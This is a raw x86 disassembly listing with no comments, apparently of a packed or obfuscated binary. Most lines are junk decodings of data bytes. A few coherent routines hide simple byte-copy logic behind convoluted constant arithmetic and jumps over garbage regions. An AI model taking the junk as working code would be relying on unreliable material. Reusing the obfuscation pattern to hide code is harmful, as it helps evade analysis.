  415090:	ss (bad) 
  415092:	fnstenv [ebx+0x74614f19]
  415098:	jge    0x41510d
  41509a:	or     DWORD PTR [eax+0x1b5fa4a6],ebp
  4150a0:	pop    esi
  4150a1:	scas   eax,DWORD PTR es:[edi]
  4150a2:	mul    ch
  4150a4:	push   edx
  4150a5:	leave  
  4150a6:	and    DWORD PTR [edi-0x45],0x4f2784d0
  4150ad:	sub    eax,0xdf8af790
  4150b2:	hlt    
  4150b3:	std    
  4150b4:	jb     0x41506c
  4150b6:	aam    0xfb
  4150b8:	adc    BYTE PTR [ebx],0x5c
  4150bb:	fimul  WORD PTR [eax+0x36]
  4150be:	retf   0x1ed7
  4150c1:	xor    bh,BYTE PTR [edx+0x6e]
  4150c4:	pop    esp
  4150c5:	mov    edi,0x3f5eac78
  4150ca:	xchg   ebx,eax
  4150cb:	loopne 0x415106
  4150cd:	js     0x4150e7
  4150cf:	sub    cl,BYTE PTR [edi]
  4150d1:	or     ebp,esi
  4150d3:	and    esp,DWORD PTR [ebx]
  4150d5:	dec    edi
  4150d6:	cmp    al,0x4b
  4150d8:	jmp    0xba6d:0x3008259a
  4150df:	mov    BYTE PTR [ebx],cl
  4150e1:	(bad)  
  4150e2:	jecxz  0x415104
  4150e4:	lahf   
  4150e5:	jns    0x415133
  4150e7:	ins    DWORD PTR es:[edi],dx
  4150e8:	or     bl,BYTE PTR [ebx+0x13]
  4150eb:	cld    
  4150ec:	cmp    BYTE PTR [edx+ebp*4],ah
  4150ef:	in     eax,0x21
  4150f1:	jmp    0xd618:0xec5e882
  4150f8:	mov    edx,0x9d9b8cb8
  4150fd:	xchg   bl,dl
  4150ff:	bound  esp,QWORD PTR [esi]
  415101:	push   esi
  415102:	pop    eax
  415103:	lahf   
  415104:	cdq    
  415105:	daa    
  415106:	jecxz  0x415182
  415108:	lahf   
  415109:	push   esp
  41510a:	xchg   BYTE PTR [ecx],cl
  41510c:	addr16 js 0x415151
  41510f:	and    eax,0xc015c26e
  415114:	scas   al,BYTE PTR es:[edi]
  415115:	adc    cl,BYTE PTR [ebp-0x38]
  415118:	cld    
  415119:	data16 hlt 
  41511b:	stc    
  41511c:	rcr    DWORD PTR [esi+0x5],1
  41511f:	push   cs
  415120:	dec    ebx
  415121:	pop    edx
  415122:	mov    ecx,0x6a0a23a6
  415127:	std    
  415128:	adc    eax,0x1779f7d8
  41512d:	cmp    ah,ah
  41512f:	je     0x4150d0
  415131:	(bad)  
  415132:	sub    eax,0x85cf0381
  415137:	je     0x41511b
  415139:	call   0xac8a:0x6a884bc8
  415140:	retf   
  415141:	out    0x60,eax
  415143:	inc    esp
  415144:	mov    ds:0x603a371b,al
  415149:	stc    
  41514a:	xor    DWORD PTR [edx+0x57d097b2],ebx
  415150:	sbb    ebp,DWORD PTR [edi-0x60d63bb8]
  415156:	loope  0x415103
  415158:	jo     0x4150fe
  41515a:	xor    al,0xdf
  41515c:	cmp    al,0xdd
  41515e:	inc    edx
  41515f:	aaa    
  415160:	dec    ebx
  415161:	cli    
  415162:	imul   eax,DWORD PTR [ebp-0x5d],0x9542252a
  415169:	pop    ss
  41516a:	jns    0x415113
  41516c:	cmp    eax,0x3b569a7d
  415171:	test   BYTE PTR [ebx-0x22],al
  415174:	add    ecx,ebp
  415176:	ss sahf 
  415178:	aad    0x99
  41517a:	aaa    
  41517b:	ret    
  41517c:	cmp    cl,bh
  41517e:	into   
  41517f:	das    
  415180:	xchg   BYTE PTR [edx],al
  415182:	add    BYTE PTR [ebx-0x53],0x92
  415186:	scas   eax,DWORD PTR es:[edi]
  415187:	adc    DWORD PTR [ecx],esi
  415189:	mov    bh,0x22
  41518b:	test   al,0x9c
  41518d:	std    
  41518e:	mov    esi,0xfd38dcc4
  415193:	jecxz  0x41512d
  415195:	jle    0x4151f8
  415197:	stos   DWORD PTR es:[edi],eax
  415198:	imul   esp,ebx,0x6c3959b6
  41519e:	out    0xbd,al
  4151a0:	or     al,0x35
  4151a2:	xchg   ebp,eax
  4151a3:	xchg   esp,eax
  4151a4:	adc    ecx,0xffffffad
  4151a7:	jl     0x4151a9
  4151a9:	ficom  DWORD PTR [ebp+0x23dc9736]
  4151af:	inc    ebp
  4151b0:	inc    DWORD PTR [esi+0x2b110559]
  4151b6:	iret   
  4151b7:	ss sub al,0x14
  4151ba:	inc    edi
  4151bb:	aas    
  4151bc:	into   
  4151bd:	push   esp
  4151be:	in     eax,0xf2
  4151c0:	loopne 0x4151df
  4151c2:	out    dx,eax
  4151c3:	add    eax,0xbaaa872f
  4151c8:	fcom   QWORD PTR [ebp-0x1413988f]
  4151ce:	xor    esi,DWORD PTR [ecx+esi*8+0x4f]
  4151d2:	int3   
  4151d3:	mov    dl,0x8b
  4151d5:	push   esp
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x527e1b8c]
  415305:	shl    DWORD PTR [ecx],1
  415307:	mov    esi,0x18160ebc
  41530c:	mov    ch,0x12
  41530e:	sbb    BYTE PTR [eax],bl
  415310:	fsin   
  415312:	ins    BYTE PTR es:[edi],dx
  415313:	neg    bh
  415315:	jo     0x415320
  415317:	iret   
  415318:	lahf   
  415319:	pusha  
  41531a:	out    0x9,al
  41531c:	pop    esi
  41531d:	imul   edx,ebx,0xffffff89
  415320:	mul    DWORD PTR [edx+0x4]
  415323:	daa    
  415324:	inc    edx
  415325:	fs dec ebx
  415327:	ins    DWORD PTR es:[edi],dx
  415328:	(bad)  
  415329:	xchg   ebp,eax
  41532a:	not    BYTE PTR [ecx+0x6b8b1f5b]
  415330:	int    0x20
  415332:	jno    0x4152bf
  415334:	sbb    eax,0xceb7d64c
  415339:	mov    dh,0x92
  41533b:	aas    
  41533c:	int    0x6c
  41533e:	in     al,dx
  41533f:	dec    esp
  415340:	xchg   BYTE PTR [ecx-0x26],al
  415343:	mov    dl,0x4d
  415345:	push   ds
  415346:	shr    BYTE PTR [edi+0x27],cl
  415349:	sub    esp,DWORD PTR [ebx]
  41534b:	int3   
  41534c:	sbb    BYTE PTR cs:[ecx],al
  41534f:	sahf   
  415350:	fcom   QWORD PTR [ecx+ecx*1]
  415353:	sbb    DWORD PTR [ecx+0x26],eax
  415356:	pop    es
  415357:	dec    eax
  415358:	mov    cl,0x44
  41535a:	adc    al,cl
  41535c:	mov    ebp,0x1d556507
  415361:	add    ebp,DWORD PTR [ebx-0x5f]
  415364:	cs je  0x4153e5
  415367:	inc    edi
  415368:	pop    edi
  415369:	ins    BYTE PTR es:[edi],dx
  41536a:	or     eax,DWORD PTR [ebp-0x10]
  41536d:	mov    BYTE PTR [ebx-0x59a6d01f],ch
  415373:	std    
  415374:	jmp    0xbdb74271
  415379:	mov    cl,0x80
  41537b:	or     BYTE PTR [eax-0x31],bh
  41537e:	dec    ecx
  41537f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415380:	sahf   
  415381:	sbb    bl,BYTE PTR [ebp-0x3]
  415384:	cmc    
  415385:	imul   eax,DWORD PTR [edx+ebp*4+0x64],0x41
  41538a:	adc    esi,DWORD PTR [eax+0xc]
  41538d:	add    al,0x8c
  41538f:	jmp    0xc09393d1
  415394:	mov    ah,0xed
  415396:	mov    cs,WORD PTR ss:[eax+0x572c3731]
  41539d:	es mov dh,0x83
  4153a0:	aas    
  4153a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153a2:	and    ebp,esp
  4153a4:	or     DWORD PTR [edx+ebx*2],ebp
  4153a7:	pop    edx
  4153a8:	ja     0x415415
  4153aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153ab:	jp     0x415380
  4153ad:	mov    edx,esi
  4153af:	imul   esp,DWORD PTR [edx-0x6c8d43d4],0x65b9038a
  4153b9:	lock mov edx,0x5321619d
  4153bf:	jl     0x415356
  4153c1:	popf   
  4153c2:	rcl    bh,0x0
  4153c5:	loope  0x415349
  4153c7:	jmp    0x3b0216ff
  4153cc:	or     BYTE PTR [edi-0x6dc0bd59],bh
  4153d2:	test   eax,0xaec0499c
  4153d7:	xor    esp,esp
  4153d9:	dec    ecx
  4153da:	aad    0x8e
  4153dc:	arpl   WORD PTR [ecx+edx*4+0x74b78d21],di
  4153e3:	sar    BYTE PTR [edi+edi*2-0x79ba3c5f],0x3f
  4153eb:	mov    DWORD PTR [eax-0x1b97f688],esp
  4153f1:	bound  ecx,QWORD PTR [ecx]
  4153f3:	out    dx,eax
  4153f4:	fist   WORD PTR [edi+0x75]
  4153f7:	add    al,0x13
  4153f9:	sbb    ah,0x41
  4153fc:	je     0x415475
  4153fe:	jae    0x415414
  415400:	retf   0x6a2d
  415403:	jg     0x4153b8
  415405:	shl    BYTE PTR [ebx+0x51],cl
  415408:	scas   eax,DWORD PTR es:[edi]
  415409:	loopne 0x4153b6
  41540b:	inc    ebx
  41540c:	sub    al,0x58
  41540e:	jnp    0x4153fe
  415410:	push   0x716d680a
  415415:	add    al,0xb8
  415417:	jnp    0x4153f5
  415419:	imul   eax,DWORD PTR [edx-0x68],0xffffffba
  41541d:	adc    DWORD PTR [edi+edx*8+0x75],edx
  415421:	inc    eax
  415422:	push   ds
  415423:	loop   0x41548a
  415425:	std    
  415426:	push   edx
  415427:	sahf   
  415428:	loop   0x415422
  41542a:	not    eax
  41542c:	and    bh,BYTE PTR [ecx-0x659dbf80]
  415432:	pop    edi
  415433:	add    dh,cl
  415435:	dec    ebx
  415436:	inc    edi
  415437:	mov    esp,0xb2093c87
  41543c:	xchg   ebp,eax
  41543d:	mov    edx,0xf6dbdcb3
  415442:	les    edx,FWORD PTR [ecx+0x77]
  415445:	xchg   edi,eax
  415446:	call   DWORD PTR [eax-0xfcf2e9d]
  41544c:	das    
  41544d:	out    0xee,eax
  41544f:	xor    ebx,DWORD PTR [edi+eiz*2+0x68]
  415453:	mov    edi,0xd31250d4
  415458:	gs call 0xdea3:0xef85bf4e
  415460:	jnp    0x4154d4
  415462:	inc    edi
  415463:	pop    edi
  415464:	mov    ecx,0x115af241
  415469:	cmp    BYTE PTR [eax-0x57],dl
  41546c:	gs xor cl,dh
  41546f:	and    eax,DWORD PTR [ebx]
  415471:	fdiv   QWORD PTR [edi-0x20703c2c]
  415477:	jnp    0x4154ea
  415479:	push   ebp
  41547a:	jae    0x4154c3
  41547c:	dec    BYTE PTR [eax]
  41547e:	shr    BYTE PTR [ebp-0x7b],0x4f
  415482:	add    ah,BYTE PTR [ebp+0x36]
  415485:	pop    esp
  415486:	sbb    esp,ebx
  415488:	scas   al,BYTE PTR es:[edi]
  415489:	push   esp
  41548a:	mov    BYTE PTR [ebp+0x7a782241],0x2b
  415491:	sbb    eax,0xa664a370
  415496:	lahf   
  415497:	ds retf 
  415499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41549a:	xor    edi,edx
  41549c:	ins    BYTE PTR es:[edi],dx
  41549d:	mov    edi,0x91086c89
  4154a2:	cmp    edx,eax
  4154a4:	ss sbb eax,0xb3f269ab
  4154aa:	lods   eax,DWORD PTR ds:[esi]
  4154ab:	jle    0x4154a9
  4154ad:	stc    
  4154ae:	ret    
  4154af:	xchg   BYTE PTR [esi+eax*2+0x1189fd19],al
  4154b6:	push   ds
  4154b7:	push   edi
  4154b8:	popf   
  4154b9:	jge    0x415500
  4154bb:	mov    ch,0xc3
  4154bd:	lods   eax,DWORD PTR ds:[esi]
  4154be:	sbb    BYTE PTR [edx+0x3a],0xd6
  4154c2:	jg     0x415529
  4154c4:	rcr    BYTE PTR [edi+0x7a4678c1],1
  4154ca:	sbb    BYTE PTR [edx+0xdde0d6d],0xc0
  4154d1:	or     DWORD PTR [ebp-0x15],0x7e45c5e0
  4154d8:	and    esp,DWORD PTR es:[ecx]
  4154db:	fs push ecx
  4154dd:	lds    ebx,FWORD PTR [ebx+0x594c1f38]
  4154e3:	mov    bh,cl
  4154e5:	xchg   DWORD PTR [ecx-0x1f1cf13f],esp
  4154eb:	repnz pop ss
  4154ed:	xor    edx,DWORD PTR [edx+ecx*8+0x5f0636b9]
  4154f4:	cli    
  4154f5:	sbb    DWORD PTR [ecx+edx*2+0x484ebfb0],edi
  4154fc:	les    ecx,FWORD PTR [ebx+0x62]
  4154ff:	das    
  415500:	xchg   esi,eax
  415501:	in     eax,0xe0
  415503:	jne    0x4154aa
  415505:	mov    ebx,DWORD PTR [edi+0x62]
  415508:	jecxz  0x41549f
  41550a:	pop    esp
  41550b:	out    0x7c,eax
  41550d:	aam    0x43
  41550f:	lock pop esp
  415511:	pop    edi
  415512:	hlt    
  415513:	fdiv   QWORD PTR [esp+eax*1-0x1bb6ae7]
  41551a:	mov    ebp,0xa3219c01
  41551f:	xor    eax,0xe3f6277c
  415524:	pop    edx
  415525:	and    al,0x1c
  415527:	lahf   
  415528:	pop    ds
  415529:	or     eax,0xf06c7117
  41552e:	adc    eax,0x5c88af13
  415533:	jmp    0xc203:0x664e4ad0
  41553a:	ret    
  41553b:	jmp    0x13816991
  415540:	ins    BYTE PTR es:[edi],dx
  415541:	fistp  QWORD PTR [esi+0x9]
  415544:	dec    eax
  415545:	cld    
  415546:	xchg   BYTE PTR [ebp-0x2715ee74],dh
  41554c:	add    dl,cl
  41554e:	int    0xb3
  415550:	or     ah,al
  415552:	rol    DWORD PTR [eax-0x289327f2],cl
  415558:	sub    ebx,edx
  41555a:	arpl   WORD PTR [eax+0x2e],cx
  41555d:	or     al,0x85
  41555f:	jle    0x41558f
  415561:	aam    0x11
  415563:	loope  0x415549
  415565:	shl    BYTE PTR [edx+0x1bc161a8],0x3a
  41556c:	sbb    esi,esi
  41556e:	jno    0x415589
  415570:	into   
  415571:	in     al,dx
  415572:	xchg   edx,eax
  415573:	(bad)
  415577:	or     al,0x56
  415579:	or     cl,BYTE PTR [edx+0xbabad06]
  41557f:	mov    edx,0x22094980
  415584:	adc    eax,0x77f6dc7
  415589:	sti    
  41558a:	cmc    
  41558b:	inc    esi
  41558c:	pop    ebp
  41558d:	mov    ecx,DWORD PTR [ecx]
  41558f:	jb     0x415533
  415591:	or     esi,DWORD PTR [eax+0x47]
  415594:	jmpw   0x29a
  415598:	mov    esi,0xdcac8276
  41559d:	sbb    eax,0x557da8a3
  4155a2:	xchg   DWORD PTR [edi+0x77b3f66c],ebp
  4155a8:	xor    edi,ecx
  4155aa:	lds    esp,FWORD PTR [esi+edx*8]
  4155ad:	sbb    edi,DWORD PTR [eax+0x7c74ac42]
  4155b3:	jnp    0x415617
  4155b5:	jecxz  0x41560f
  4155b7:	icebp  
  4155b8:	xchg   BYTE PTR [esi],al
  4155ba:	in     eax,0x20
  4155bc:	push   ebx
  4155bd:	xor    BYTE PTR [edi-0x60],bl
  4155c0:	dec    esi
  4155c1:	test   eax,0x7fbba489
  4155c6:	icebp  
  4155c7:	aas    
  4155c8:	mov    eax,ds:0x9a11db02
  4155cd:	shl    BYTE PTR [ebp-0x3a],0xd7
  4155d1:	leave  
  4155d2:	sub    BYTE PTR ss:[ebx],ah
  4155d5:	sub    dl,BYTE PTR [esi]
  4155d7:	dec    edx
  4155d8:	jbe    0x4155c4
  4155da:	dec    eax
  4155db:	fnstenv ds:0x2514d998
  4155e1:	or     esi,eax
  4155e3:	ja     0x4155f7
  4155e5:	mov    ebp,0x139c4c5d
  4155ea:	pop    edi
  4155eb:	inc    esp
  4155ec:	push   ds
  4155ed:	neg    BYTE PTR [edi-0x6b]
  4155f0:	jb     0x4155b5
  4155f2:	or     eax,0xbf64d684
  4155f7:	test   DWORD PTR [esi-0x38],edi
  4155fa:	pop    ebp
  4155fb:	sbb    eax,DWORD PTR [ecx]
  4155fd:	imul   ebp,DWORD PTR [eax],0x1b
  415600:	xlat   BYTE PTR ds:[ebx]
  415601:	adc    al,0x6e
  415603:	cwde   
  415604:	add    al,0x91
  415606:	jmp    0x1cc59471
  41560b:	or     ah,al
  41560d:	pop    eax
  41560e:	pop    eax
  41560f:	sti    
  415610:	sbb    eax,0x27b2f02
  415615:	push   ebx
  415616:	(bad)  
  415617:	scas   eax,DWORD PTR es:[edi]
  415618:	xor    BYTE PTR [eax],dl
  41561a:	cmp    DWORD PTR [ebp-0x48],0xa4b4fce7
  415621:	iret   
  415622:	dec    eax
  415623:	xchg   DWORD PTR [esi],edi
  415625:	dec    esp
  415626:	xchg   ebp,eax
  415627:	gs push ebp
  415629:	loope  0x4156aa
  41562b:	mov    ds:0xf4ddcad0,al
  415630:	aaa    
  415631:	jmp    0x2ab1c6f
  415636:	and    BYTE PTR [edx+ebx*2+0x20],dh
  41563a:	ja     0x4156a3
  41563c:	push   ebx
  41563d:	add    bh,BYTE PTR [edx+0x1306ebdc]
  415643:	mov    eax,ds:0x458bad0b
  415648:	lock mov edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415671
  41567f:	sub    BYTE PTR [ecx],ah
  415681:	jle    0x4156db
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp+0x56181812],dh
  41568b:	sbb    eax,0x735cf72e
  415690:	ds mov bh,0x56
  415693:	add    eax,0x8fe1a730
  415698:	int3   
  415699:	mov    al,0xe7
  41569b:	jle    0x415674
  41569d:	add    eax,0x8d7df441
  4156a2:	(bad)  
  4156a3:	xchg   esi,eax
  4156a4:	and    edx,DWORD PTR [esi]
  4156a6:	push   eax
  4156a7:	fild   DWORD PTR ds:[esi+ebx*4+0x0]
  4156ac:	js     0x415719
  4156ae:	pop    ss
  4156af:	and    BYTE PTR [ecx-0x6092d85f],ch
  4156b5:	out    0x85,eax
  4156b7:	je     0x4156ca
  4156b9:	popa   
  4156ba:	sbb    ch,bh
  4156bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156bd:	jmp    0x41566c
  4156bf:	pop    ecx
  4156c0:	pop    esi
  4156c1:	fisub  WORD PTR [esi+edx*1]
  4156c4:	mov    eax,DWORD PTR [eax]
  4156c6:	xchg   ecx,eax
  4156c7:	mov    dh,0xf8
  4156c9:	and    eax,0x28e73e0f
  4156ce:	push   edi
  4156cf:	mov    al,0x69
  4156d1:	rcl    BYTE PTR [ebx-0x3efe57f7],cl
  4156d7:	mov    al,0xab
  4156d9:	adc    BYTE PTR [ebp+0x5e],ch
  4156dc:	jbe    0x41573b
  4156de:	fsubr  DWORD PTR [eax-0x4ddb644]
  4156e4:	sbb    DWORD PTR [edi+0x1],esi
  4156e7:	daa    
  4156e8:	out    0x7,eax
  4156ea:	daa    
  4156eb:	icebp  
  4156ec:	repnz and al,0xb7
  4156ef:	(bad)  
  4156f0:	cmp    eax,0x39bcac39
  4156f5:	int    0x15
  4156f7:	jmp    0xfa4eaf34
  4156fc:	mov    eax,0x2b3e3f46
  415701:	fld    DWORD PTR [edx+0x61]
  415704:	outs   dx,DWORD PTR ds:[esi]
  415705:	push   es
  415706:	jle    0x4156bb
  415708:	push   edx
  415709:	dec    ebx
  41570a:	fwait
  41570b:	jl     0x415725
  41570d:	push   cs
  41570e:	mov    al,0x2e
  415710:	inc    esi
  415711:	cmp    al,0x33
  415713:	xchg   ecx,edx
  415715:	mov    DWORD PTR [ecx+ebx*8+0x1724a60b],esi
  41571c:	mov    ecx,0xaa53d3b5
  415721:	or     DWORD PTR [esi+0x35aff9cf],ebp
  415727:	sbb    eax,0x22bc55a6
  41572c:	cwde   
  41572d:	in     eax,0xc5
  41572f:	fsubp  st(0),st
  415731:	ret    0x9831
  415734:	ret    
  415735:	repz xor cl,BYTE PTR [ebx+eax*8]
  415739:	sbb    esi,DWORD PTR [ebp+0x7bd189d9]
  41573f:	cld    
  415740:	jg     0x415775
  415742:	xor    al,0x27
  415744:	push   cs
  415745:	sub    DWORD PTR [edx],ebp
  415747:	bound  ecx,QWORD PTR [edi+0x4214de61]
  41574d:	pop    ecx
  41574e:	sbb    dl,bh
  415750:	inc    esp
  415751:	daa    
  415752:	dec    eax
  415753:	jle    0x4157b3
  415755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415756:	jp     0x415773
  415758:	stos   DWORD PTR es:[edi],eax
  415759:	push   0xffffff90
  41575b:	mov    ds:0x1e322c0b,eax
  415760:	xor    ch,BYTE PTR ds:0x52b7dd06
  415766:	loope  0x4156e8
  415768:	jle    0x41571d
  41576a:	pop    es
  41576b:	mov    ah,0xce
  41576d:	stos   DWORD PTR es:[edi],eax
  41576e:	add    ah,BYTE PTR [ecx+0x68]
  415771:	xchg   ecx,eax
  415772:	push   ecx
  415773:	fwait
  415774:	dec    esi
  415775:	inc    ecx
  415776:	enter  0x7bf7,0xd1
  41577a:	dec    edi
  41577b:	jmp    0xf183:0x23ac8aa1
  415782:	and    al,BYTE PTR [ebx-0x3a9683be]
  415788:	fidivr WORD PTR [edx-0x11]
  41578b:	push   edx
  41578c:	sbb    BYTE PTR [eax-0xdb6afcf],0x73
  415793:	jp     0x415788
  415795:	mov    DWORD PTR [edx],esp
  415797:	call   DWORD PTR [ecx+0x4]
  41579a:	jg     0x415731
  41579c:	xor    DWORD PTR [edi],edi
  41579e:	out    0xb4,al
  4157a0:	cmp    BYTE PTR [eax+0x3e15a69d],ah
  4157a6:	jl     0x415808
  4157a8:	fmul   QWORD PTR [edx]
  4157aa:	das    
  4157ab:	cmp    BYTE PTR [eax-0x3b8792e3],ch
  4157b1:	xchg   esi,eax
  4157b2:	das    
  4157b3:	jmp    0x6cf0:0x9d72c6a6
  4157ba:	retf   0x6cdb
  4157bd:	out    0xa3,al
  4157bf:	imul   edx,esp,0x83f48c76
  4157c5:	(bad)  
  4157c6:	cmc    
  4157c7:	rcr    ch,0x69
  4157ca:	push   0xffffff95
  4157cc:	xor    ch,0x60
  4157cf:	dec    esi
  4157d0:	scas   al,BYTE PTR es:[edi]
  4157d1:	or     al,0x0
  4157d3:	lock fs jge 0x41581f
  4157d7:	outs   dx,BYTE PTR ds:[esi]
  4157d8:	shl    BYTE PTR [ebp+ecx*8-0x6a],1
  4157dc:	dec    eax
  4157dd:	mov    al,0x93
  4157df:	jecxz  0x415801
  4157e1:	adc    eax,0x4a929862
  4157e6:	pop    edx
  4157e7:	jp     0x415806
  4157e9:	push   esi
  4157ea:	out    dx,al
  4157eb:	add    al,0x93
  4157ed:	dec    ecx
  4157ee:	mov    dl,0xf0
  4157f0:	retf   0x439c
  4157f3:	push   eax
  4157f4:	xor    al,0xe6
  4157f6:	mov    edi,0x36182306
  4157fb:	enter  0xe5ff,0x23
  4157ff:	dec    eax
  415800:	xor    BYTE PTR [ebx+0x2],ch
  415803:	adc    eax,0x1af17777
  415808:	pop    es
  415809:	xchg   esp,eax
  41580a:	sahf   
  41580b:	repz cmp eax,0x20d9eb78
  415811:	pop    edi
  415812:	pop    ebx
  415813:	sub    al,0xfd
  415815:	dec    esi
  415816:	inc    esp
  415817:	cmp    eax,0xcdf4fb51
  41581c:	shl    cl,cl
  41581e:	mov    edx,esp
  415820:	push   ebp
  415821:	dec    ebx
  415822:	sbb    BYTE PTR [edx+0x35],bl
  415825:	rcl    bl,cl
  415827:	fwait
  415828:	pop    es
  415829:	sbb    edi,DWORD PTR [esi+0x5c]
  41582c:	adc    DWORD PTR [eax+0x7423c256],edi
  415832:	stos   DWORD PTR es:[edi],eax
  415833:	sti    
  415834:	je     0x415875
  415836:	jecxz  0x41588d
  415838:	sbb    eax,DWORD PTR [ecx-0x48ec0dad]
  41583e:	jmp    0xb836:0x80f38950
  415845:	dec    edx
  415846:	retf   0xf33c
  415849:	clc    
  41584a:	sahf   
  41584b:	mov    ah,0x8a
  41584d:	adc    ebx,ebp
  41584f:	push   cs
  415850:	fisttp WORD PTR [ebx+0x26]
  415853:	lahf   
  415854:	adc    al,0xe4
  415856:	fdivrp st(5),st
  415858:	lods   al,BYTE PTR ds:[esi]
  415859:	in     eax,dx
  41585a:	and    al,0x5f
  41585c:	int    0x8
  41585e:	cmp    DWORD PTR [ecx],eax
  415860:	xor    eax,0xb32cece6
  415865:	or     DWORD PTR [ebx-0x1c88e681],esp
  41586b:	or     eax,DWORD PTR [eax+0x597f37d9]
  415871:	mov    eax,ds:0x3b4ad5f0
  415876:	dec    edx
  415877:	jae    0x415803
  415879:	cmp    al,0x76
  41587b:	xchg   edx,eax
  41587c:	shr    BYTE PTR [esi+eiz*1+0x60],0x53
  415881:	stos   DWORD PTR es:[edi],eax
  415882:	mov    eax,ds:0xe64d12ff
  415887:	dec    ecx
  415888:	aaa    
  415889:	jns    0x41582f
  41588b:	fcomp  QWORD PTR [edi+0x6f]
  41588e:	pop    ss
  41588f:	xor    BYTE PTR [eax-0x2c20ef51],0xf1
  415896:	(bad)  
  415897:	mov    ebx,0x266e3ab3
  41589c:	in     al,dx
  41589d:	test   al,0x65
  41589f:	dec    eax
  4158a0:	adc    DWORD PTR [ebp+edi*2+0x4a6959eb],edi
  4158a7:	jno    0x41589f
  4158a9:	ja     0x415860
  4158ab:	cld    
  4158ac:	push   esp
  4158ad:	sub    edx,DWORD PTR [edi+ebx*8-0x42c1c7ca]
  4158b4:	push   eax
  4158b5:	inc    edi
  4158b6:	ins    DWORD PTR es:[edi],dx
  4158b7:	shl    BYTE PTR [ebp+edx*4+0x691f231b],cl
  4158be:	inc    ebp
  4158bf:	push   es
  4158c0:	aad    0x83
  4158c2:	dec    edx
  4158c3:	or     DWORD PTR [ecx],ebp
  4158c5:	push   0xffffffdd
  4158c7:	cmp    al,0x88
  4158c9:	mov    esi,0x139c1a9d
  4158ce:	sbb    ah,dh
  4158d0:	sub    edx,0x10
  4158d3:	jmp    0x4158f5
  4158d5:	nop
  4158d6:	sub    dh,dl
  4158d8:	jmp    0xa40a:0xc466282e
  4158df:	and    DWORD PTR [edi-0x312fd7bf],eax
